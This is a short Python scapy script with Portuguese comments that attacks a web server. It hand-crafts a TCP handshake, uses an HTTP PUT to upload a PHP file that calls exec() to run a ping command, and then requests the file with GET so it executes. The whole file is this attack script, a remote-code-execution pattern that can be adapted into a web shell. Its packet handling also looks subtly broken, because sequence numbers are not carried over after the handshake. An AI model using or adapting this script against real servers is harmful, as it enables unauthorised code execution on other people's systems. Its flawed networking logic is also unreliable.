from scapy.all import *

def build_put_packet(target_ip, target_port, file_content):
    # Construir a requisição
    put_body = f"PUT /uploads/ping.php HTTP/1.1\r\nHost: {target_ip}\r\nContent-Length: {len(file_content)}\r\n\r\n{file_content}"

    # Monta o pacote 
    ip = IP(dst=target_ip)
    tcp = TCP(dport=target_port)
    put_pkt = ip / tcp / put_body
    return put_pkt

def build_get_packet(target_ip, target_port):
    # Construir a requisição
    get_body = f"GET /uploads/ping.php HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"

    # Monta o pacote 
    ip = IP(dst=target_ip)
    tcp = TCP(dport=target_port)
    get_pkt = ip / tcp / get_body
    return get_pkt

# arquivo ping.php
file_content = "<?php exec('ping 99.99.99.50');?>"

# three-way handshake
ip = IP(dst="99.99.99.254")
tcp = TCP(dport=8585, flags="S")
resp = sr1(ip/tcp)

if resp:
    print("Conexão estabelecida com sucesso.")
    tcp.flags = "A"
    tcp.ack = resp[TCP].seq + 1
    send(ip/tcp)
    
    # Constrói e envia a requisição PUT
    put_pkt = build_put_packet("99.99.99.254", 8585, file_content)
    resp_put = sr1(put_pkt)
    if resp_put:
        print("Arquivo enviado com sucesso.")
    
    # Constrói e envia a requisição GET
    get_pkt = build_get_packet("99.99.99.254", 8585)
    resp_get = sr1(get_pkt)    
    if resp_get:
        print("Resposta GET: ")
        print(resp_get.summary())
else:
    print("Não foi possível estabelecer a conexão.")
